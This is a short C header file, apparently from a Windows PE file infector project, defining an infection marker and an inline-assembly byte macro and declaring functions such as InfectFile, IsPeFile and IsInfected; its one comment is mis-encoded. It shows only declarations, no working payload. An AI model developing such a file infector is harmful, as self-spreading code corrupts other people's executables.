#include "windows.h"
#include <tchar.h>

//��Ⱦ���
#define INFECTFLAG	0xABCD
#define db(x) __asm _emit x

BOOL InfectFile(const char* fname);
BOOL IsPeFile(PVOID pHdr);
BOOL IsInfected(PVOID pHdr);
int Align(int size,int n);